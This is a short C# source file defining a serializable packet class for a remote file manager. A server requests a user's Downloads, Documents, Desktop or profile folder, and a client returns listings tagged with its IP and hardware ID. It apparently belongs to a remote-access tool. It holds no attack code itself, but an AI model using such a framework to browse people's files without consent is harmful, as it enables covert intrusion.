using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class ShortCutFileManagersPacket : IPacket
    {
        public enum ShortCuts : byte 
        {
            DOWNLOADS =     0,
            DOCUMENTS =     1,
            DESKTOP =       2,
            USER_PROFILE =  3
        }
        //server
        public ShortCutFileManagersPacket(ShortCuts shortCuts) : base()
        {
            this.packetType = PacketType.FM_SHORTCUT_PATH;
            this.shortCuts = shortCuts;
        }

        //client
        public ShortCutFileManagersPacket(Dictionary<ushort, List<object[]>> filesAndDirs, string baseIp, string HWID) : base()
        {
            packetType = PacketType.FM_SHORTCUT_PATH;
            this.baseIp = baseIp;
            this.HWID = HWID;

            this.filesAndDirs = filesAndDirs;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public string path { get; set; }
        public ShortCuts shortCuts { get; set; }
        public Dictionary<ushort, List<object[]>> filesAndDirs { get; set; }
    }
}
